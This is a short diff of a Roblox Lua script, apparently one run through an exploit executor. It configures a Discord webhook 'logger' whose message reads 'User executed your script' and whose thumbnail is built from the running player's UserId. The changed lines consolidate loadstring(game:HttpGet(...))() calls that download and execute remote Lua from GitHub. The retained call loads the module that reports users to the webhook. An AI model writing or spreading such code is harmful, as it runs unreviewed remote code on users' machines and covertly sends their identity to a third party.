@@ -30,8 +30,7 @@ _G.EmbedMessage = "User executed your script"
 _G.EmbedColor = 16711680
 _G.EmbedThumbnail = "https://www.roblox.com/headshot-thumbnail/image?userId="..game.Players.LocalPlayer.UserId.."&width=150&height=150&format=png"
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Celesth/celes.wh/main/mainUtils.luau"))()
-local Celesth = loadstring(game:HttpGet("https://raw.githubusercontent.com/Celesth/CelesthLogger/main/CelesthLogger.lua"))()
+local Celesth = loadstring(game:HttpGet("https://raw.githubusercontent.com/Celesth/celes.wh/main/mainUtils.luau"))()
 
 Celesth:Log("https://discord.com/api/webhooks/...")
 
